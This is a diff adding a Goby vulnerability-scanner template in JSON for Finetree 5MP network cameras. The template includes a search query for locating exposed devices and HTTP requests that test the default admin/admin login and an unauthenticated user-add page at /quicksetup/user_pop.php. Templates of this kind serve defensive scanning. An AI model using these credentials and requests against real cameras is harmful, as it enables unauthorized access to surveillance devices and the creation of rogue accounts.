@@ -1,0 +1,83 @@
+{
+      "Name": "Finetree 5MP Network Camera Default Login unauthorized user add",
+      "Level": "3",
+      "Tags": [
+            "defaultaccount"
+      ],
+      "GobyQuery": "title=\"5MP Network Camera\"",
+      "Description": "Finetree 5MP Network Camera is a network camera.",
+      "Product": "Finetree 5MP",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "Finetree 5MP Camera has default password (admin/admin) and unauthorized user add /quicksetup/user_pop.php?method=add",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "user=admin&pwd=admin&method=login"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "302",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/quicksetup/user_pop.php?method=add",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Add User",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
